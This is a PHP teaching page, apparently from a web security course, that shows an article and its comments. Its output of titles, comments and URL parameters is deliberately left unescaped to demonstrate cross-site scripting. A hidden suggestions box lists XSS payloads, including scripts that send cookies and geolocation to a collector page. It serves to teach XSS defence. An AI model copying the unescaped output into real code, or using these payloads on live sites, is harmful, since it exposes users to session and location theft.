<?php
  require 'db_connect.php';
  
  if (!isset($_GET['id']) || !ctype_digit($_GET['id']))
  { // If there is no "id" URL data or it isn't a number
    $thread = false;
  }
  else
  {  
    // Select details of specified article
    // Since the user could tamper with the URL data, a prepared statement is used
    $stmt = $db->prepare("SELECT * FROM xss_article WHERE article_id = ?");
    $stmt->execute( [$_GET['id']] );
    $article = $stmt->fetch();
  }
  
  if (!$article)
  { // If no data (no article with that ID in the database)
    echo '<p>Invalid article ID.</p>';
    exit;  
  }
?>
<!DOCTYPE html>
<html>
  <head>
  <title>XSS Example - <?= $article['title'] ?></title>
  <meta name="author" content="Greg Baatard" />
  <meta name="description" content="View article page for XSS example" />
  <link rel="stylesheet" type="text/css" href="../example_stylesheet.css" />
  <style> pre {font-family: monospace; padding-bottom: 15px; border-bottom: 1px solid grey; width: 95ch;} </style>
  <script>
    function toggleXSSBox()
    {
      if (document.getElementById('xss').style.display == 'none' )
      {
        document.getElementById('xss').style.display = 'block';
      }
      else
      {
        document.getElementById('xss').style.display = 'none';
      }      
    }
  </script>
  </head>
  <body>
    <h3>View Article (Insecure Version)</h3>
    <a href="index.php">Back to Article List</a> | <a href="delete_comments.php?id=<?= $_GET['id'] ?>">Delete All Comments on this Article</a>
    <br /><br />
    <?php
      echo '<h2>'.$article['title'].'</h2>';
      echo '<p><small><em>Posted on '.$article['post_date'].'</em></small></p>';
      echo '<p>'.$article['content'].'</p><br />';


      echo '<h3>Comments</h3>';
      
      // Select comments of specified article
      $stmt = $db->prepare("SELECT * FROM xss_comment WHERE article_id = ? ORDER BY post_date");
      $stmt->execute( [$_GET['id']] );
      $comment_data = $stmt->fetchAll();
      
      if (count($comment_data))
      { // Loop through results to display comments
        foreach ($comment_data as $row)
        {
          $name = $row['name'] != '' ? $row['name'] : 'Anonymous';
          echo '<p style="width: 400px; border: 1px solid grey; margin: 5px; padding: 5px"><small><strong>'.$name.'</strong> says: <em>'.$row['content'].'</em></small></p>';
        }
      }
      else
      { // If no data (no comments on that article yet)
        echo '<p>No comments - be the first to comment!</p>';
      }
    ?>
    <br />
    <h3>New Comment</h3>
    <form name="new_comment" method="post" action="post_comment.php">
      
      <input type="hidden" name="article_id" value="<?= $_GET['id'] ?>" />

      <p><strong>Name:</strong><br />
        <input type="text" name="name" style="width: 398px;" />
      </p>

      <p><strong>Comment:</strong><br />
        <textarea name="content" style="width: 400px; height: 100px"></textarea>
      </p>

      <p>
        <input type="submit" name="submit" value="Submit" />
      </p>
      
      <p style="cursor: pointer;" onclick="toggleXSSBox()"><strong>XSS Suggestions</strong> (click to reveal)</p>
      <div id="xss" style="display: none;">
      
<pre>
&lt;script&gt;alert('Cats rule, dogs drool!');&lt;/script&gt;
</pre>
<pre>
&lt;img src="#" style="display: none;" onerror="alert(document.cookie);" /&gt;
</pre>
<pre>
&lt;object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgiT29mLiIpOzwvc2NyaXB0Pg=="&gt;&lt;/object&gt;
</pre>
<pre>
&lt;script&gt;
  xhr = new XMLHttpRequest();
  xhr.open("GET", "receive_data.php?data="+document.cookie);
  xhr.send();
&lt;/script&gt;
</pre>
<pre>
&lt;script&gt;
  function sendLocation(pos)
  {
    fetch("receive_data.php?data="+pos.coords.latitude+", "+pos.coords.longitude);
  }
  navigator.geolocation.getCurrentPosition(sendLocation);
&lt;/script&gt;
</pre>
        
      </div>
    </form>
  </body>
</html>